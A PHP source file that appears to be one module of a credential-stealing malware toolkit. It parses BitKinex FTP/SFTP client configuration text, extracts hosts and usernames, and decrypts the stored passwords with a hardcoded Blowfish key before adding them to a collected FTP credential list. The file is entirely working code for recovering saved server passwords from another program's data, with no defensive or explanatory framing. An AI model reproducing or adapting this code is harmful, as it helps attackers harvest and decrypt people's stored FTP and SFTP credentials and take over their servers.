<?php
	class Module_bitkinex extends Module_
	{
		protected function Decrypt($Password)
		{
			if (!strlen($Password))
				return '';

			$DecPW_ = hex2bin(trim($Password));

			if (($DecPW_ === false) || (strlen($DecPW_) % 8 != 0))
			{
				return '';
			}

			$KEY = 'BD-07021973+19101972-DB';
			$IV_ = "\0\0\0\0\0\0\0\0";

			$DecodedPW = mcrypt_decrypt(MCRYPT_BLOWFISH, $KEY, $DecPW_, MCRYPT_MODE_ECB, $IV_);

			if (!strlen($DecodedPW))
			{
				return '';
			}
			return $DecodedPW;
		}

		protected function ProcessBitkinex($Source)
		{
			$Lines = parse_lines($Source);
			$User = $Host = $Prot = '';

			foreach ($Lines as $line)
			{
				if (strpos($line, "### Node definition: ") !== false)
				{
					$User = $Host = $Prot = '';
				}

				if (strpos($line, 'TYPE = SFTP') !== false)
					$Prot = 'sftp';

				if (strpos($line, "SET DEFAULT_PATH ") !== false)
					$dir = trim(substr($line, strlen("SET DEFAULT_PATH ")));

				if (strpos($line, "SET DST_ADDR ") !== false)
					$Host = trim(substr($line, strlen("SET DST_ADDR ")));

				if (strpos($line, "SET USER ") !== false)
					$User = trim(substr($line, strlen("SET USER ")));

				if (strpos($line, "SET PASS ") !== false)
				{
					$Pass = iconv('UTF-16LE', 'UTF-8', $this->Decrypt(trim(substr($line, strlen("SET PASS ")))));

					$this->add_ftp($this->ftp_force_ssh($Host, $Prot == 'sftp'), $User, $Pass);
					$User = $Host = $Prot = '';
				}
			}
			
			$Lines = NULL;
		}

		public function process_module($Data, $Version)
		{
			switch ($Version)
			{
			case 0:
				$this->ProcessBitkinex($Data);
				break;
			default:
				return FALSE;
			}

			return TRUE;
		}
	}